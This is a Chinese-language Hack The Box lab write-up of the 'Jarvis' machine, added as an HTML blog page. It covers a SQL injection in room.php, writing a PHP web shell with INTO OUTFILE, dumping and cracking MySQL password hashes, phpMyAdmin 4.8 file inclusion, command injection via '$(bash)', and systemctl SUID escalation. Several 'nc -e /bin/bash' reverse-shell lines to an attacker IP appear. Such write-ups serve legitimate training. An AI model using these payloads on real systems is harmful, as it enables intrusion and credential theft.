@@ -1,0 +1,91 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>HTB Jarvis Writeup · Ikonw</title><meta name="description" content="HTB Jarvis Writeup - Ikonw"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/gandalfr.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/styles/solarized-light.min.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Ikonw"><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
+</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="https://p4.itc.cn/q_70/images03/20230225/87c56a7134574d718cd48f0955a962f4.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li><!-- Search Bar--><li style="margin-top: 10px;" class="nav-list-item"><form action="/search" method="GET"><input type="text" name="query" placeholder="Search" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; margin-right: 5px; width: 200px;"><button type="submit" style="padding: 8px 12px; border: none; border-radius: 4px; background-color: #007bff; color: white; cursor: pointer;"> </button></form></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">HTB Jarvis Writeup</h1><div class="tags"><a href="/tags/hackthebox/" class="tag-title">#hackthebox</a></div><div class="post-info">Jan 22, 2020</div><div class="post-content"><blockquote>
+<p>挺有意思的一台机器，有挺多种方式拿 low priv shell。</p>
+</blockquote>
+<p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
+<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/old-machine-images/20200122113820431.png" alt="a"></p>
+<h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><p>只有HTTP 比较有兴趣，title 是 <strong>Stark Hotel</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 11:48 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> jarvis.htb (10.10.10.143)</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)</span><br><span class="line">|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)</span><br><span class="line">|_  256 77:d4:ae:1f:b0:be:15:1f:f8:<span class="built_in">cd</span>:c8:15:3a:c3:69:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Stark Hotel</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">123456789101112131415161718</span><br></pre></td></tr></table></figure>
+
+<h1 id="二，HTTP-Enumeration"><a href="#二，HTTP-Enumeration" class="headerlink" title="二，HTTP Enumeration"></a>二，HTTP Enumeration</h1><p>第一个习惯就是先把gobuster 上起来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w directory-list-2.3-medium.txt -u 10.10.10.143 -t 50</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/old-machine-images/20200122115946864.png" alt="a"><br>发现有 <strong>phpmyadmin</strong><br>经过一番尝试，default 账号和密码都无效。暂时先跳过。</p>
+<p>继续浏览 stark hotel(钢铁侠爱好者，stark 和 jarvis)</p>
+<p>在网页上发现几处可疑的域名</p>
+<p><strong>supersecurehotel.htb</strong><br><strong>logger.htb</strong></p>
+<p><img src="/images/old-machine-images/2020012212053773.png" alt="a"><br>尝试着加进去 <strong>&#x2F;etc&#x2F;hosts</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.143 jarvis.htb supersecurehotel@logger.htb supersecurehotel.htb logger.htb</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>然后分别用 jarvis.htb, supersecurehotel.htb, logger.htb 等域名进行访问。 结果还是跟之前一样的 并没有什么区别。我们接着探索。</p>
+<p>一顿胡乱点击后 发现 <strong>room.php</strong> 有可疑<br><img src="/images/old-machine-images/20200122121012113.png" alt="a"><br>尝试加个双引号引号 <strong>“</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1<span class="string">&quot;</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure>
+
+<p>果然报错了<br><img src="/images/old-machine-images/20200122121923813.png" alt="a"><br>下一步 我们可以利用 ORDER BY 或者 UNION SELECT来找出查询语句有几个字段。</p>
+<p><strong>ORDER BY</strong></p>
+<p>首先使用orderby子句来确定SQL语句查询的字段数量。orderby子句会根据sql查询结果的字段来排序，如果字段不存在则会报错。</p>
+<p>可以先从10 开始试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1 ORDER BY 10</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>页面显示反常，代表没有10个字段， 一个一个慢慢下试<br><img src="/images/old-machine-images/20200122122904597.png" alt="a"><br>试到第7的时候 页面正常返回</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=1 ORDER BY 7</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>确认了 有7个字段<br>紧接着 我们能使用 UNION SELECT来确定回显位</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,3,4,5,6,7</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>可以确定 1 应该是ID，所以没有显示。<br>2 是 评分等级<br>3 是 价钱<br>4 是 介绍<br>5 是 图片<br>6 和 7 是未知。 当然这些都不重要 重要的是 回显位我们能看到。</p>
+<p><img src="/images/old-machine-images/20200122123413127.png" alt="a"><br>可以利用mysql的一些函数来获取更多信息。 比如database()<br>数据库的名字叫<strong>hotel</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,database(),4,5,6,7</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/old-machine-images/20200122140022261.png" alt="a"></p>
+<h1 id="三，拿shell"><a href="#三，拿shell" class="headerlink" title="三，拿shell"></a>三，拿shell</h1><h5 id="我们有两种方式来拿到-www-data。"><a href="#我们有两种方式来拿到-www-data。" class="headerlink" title="我们有两种方式来拿到 www-data。"></a>我们有两种方式来拿到 www-data。</h5><p><strong>一种为利用mysql读写的方式注入php执行nc</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT ... INTO OUTFILE <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">1</span><br><span class="line">http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,<span class="string">&#x27;&lt;?php system(&quot;nc -e /bin/bash 10.10.14.10 1234&quot;);?&gt;&#x27;</span>,4,5,6,7 INTO OUTFILE <span class="string">&#x27;/var/www/html/malicious.php&#x27;</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>然后我们访问 <strong>10.10.10.143&#x2F;malicious.php</strong><br>成功拿到 shell<br><img src="/images/old-machine-images/20200122141038552.png" alt="a"></p>
+<hr>
+<p><strong>第二种方式是通过 mysql函数导出 数据库的用户名和密码 登陆phpmyadmin.</strong></p>
+<p>使用 <strong>group_concat</strong> 可以把 同一个分组中的值连接起来,返回一个字符串结果 利用 <strong>“:”</strong> 来隔离分开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">room.php?cod=999 union select 1,2,(select group_concat(user,&quot;:&quot;,password,&quot;:&quot;,host) from mysql.user),4,5,6,7</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>我们成功取得 数据库的账号和密码哈希值</p>
+<p><strong>Dbadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</strong><br><img src="/images/old-machine-images/20200122141541617.png" alt="a"><br>利用 crackstation.net 来进行破解哈希值<br><img src="/images/old-machine-images/20200122141930255.png" alt="img"><br>得到密码 <strong>imissyou</strong></p>
+<p>找回之前的 phpmyadmin 登陆后发现<br><strong>Apache&#x2F;2.4.25</strong><br><strong>phpmyadmin 4.8.0</strong><br><img src="/images/old-machine-images/2020012214211048.png" alt="a"><br>文章发表的时候 phpmyadmin 最新的版本为 5.0.1<br>一番searchsploit后发现 4.8.0和4.8.1 版本有远程执行文件包含漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44928">phpmyadmin 4.8 文件包含漏洞传送门</a></p>
+<p>首先 运行sql命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php system(&quot;nc -e /bin/bash 10.10.14.12 1234&quot;);?&gt;&#x27;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/old-machine-images/20200122142927469.png" alt="a"><br>拿到session的数值<br><img src="/images/old-machine-images/20200122143910250.png" alt="a"><br>然后进行访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_b6uigkomnmk4oaa91ckc4chk4nfahaqi</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/old-machine-images/20200122143843553.png" alt="a"><br>成功！</p>
+<h1 id="四，提高用户权限"><a href="#四，提高用户权限" class="headerlink" title="四，提高用户权限"></a>四，提高用户权限</h1><p>第一件事情就是试试 sudo -l 有没有任何可以利用的权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for www-data on jarvis:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on jarvis:</span><br><span class="line">    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py</span><br><span class="line"></span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
+
+<p>这是一个小型的警报器<br><img src="/images/old-machine-images/20200122144448439.png" alt="a"><br>仔细看了源代码，有一个地方可以使用命令注入，虽然做了点黑名单来过滤。 但是由于 <strong>$</strong> 还能使用。 我们可以用类似 <strong>$(cmd)</strong> 的操作。</p>
+<p><img src="/images/old-machine-images/20200122144636466.png" alt="a"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</span><br><span class="line">Enter an IP: $(bash)</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
+
+<p>我们成功拿到pepper的shell<br>这里不懂出于什么原因 我各种命令全部都没响应。于是我用nc 重新生成了一个shell<br><img src="/images/old-machine-images/20200122145229923.png" alt="a"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:/$nc -e /bin/bash 10.10.14.10 1234</span><br><span class="line">nc -e /bin/bash 10.10.14.10 1234</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<p>于是我们成功拿到pepper 的权限<br><img src="/images/old-machine-images/20200122145350946.png" alt="a"></p>
+<h1 id="五，ROOT提权"><a href="#五，ROOT提权" class="headerlink" title="五，ROOT提权"></a>五，ROOT提权</h1><p>首先我们来查看SUID files</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/old-machine-images/20200122145847426.png" alt="a">发现 <strong>systemctl</strong> 比较可疑。<br>通过 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/systemctl/">gtfobins</a> 发现存在SUID 来进行提权的方法。<br><img src="/images/old-machine-images/20200122150211702.png" alt="a"><br>一般看到这种我都比较喜欢手动操作。<br>创建一个 pwn.service 在 pepper 的主目录里 并且把 ExecStart 指向 nc.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=/home/pepper/nc.sh</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">123456</span><br><span class="line">#!/bin/bash</span><br><span class="line">nc -e /bin/bash 10.10.14.10 1234</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<p>然后我们要创建一个 symlink 起来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl link /home/pepper/pwn.service</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>打开 nc 接听<br><img src="/images/old-machine-images/20200122151106368.png" alt="a"></p>
+<p>然后启动我们的pwn服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start pwn</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>我们成功拿到root<br><img src="/images/old-machine-images/20200122151239547.png" alt="a"></p>
+<br/>
+<br/>
+<br/>
+
+<p><img src="/images/root.gif" alt="root"></p>
+</div></article></div></main><footer><div class="paginator"><a href="/2020/01/26/HTB-Heist/" class="prev">PREV</a><a href="/2020/01/13/HTB-wall/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 - 2023 <a href="http://example.com">Ikonw</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/MikeCoder/hexo-theme-gandalfr" target="_blank">hexo-theme-gandalfr</a>.</p></div></footer></div><script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js" crossorigin="anonymous"></script><script src="//cdn.bootcss.com/jquery/3.1.1/jquery.js" crossorigin="anonymous"></script><script>$(document).ready(function() { hljs.configure({useBR: true}); $('pre').each(function(i, block) { hljs.highlightBlock(block); }); });</script></body></html>
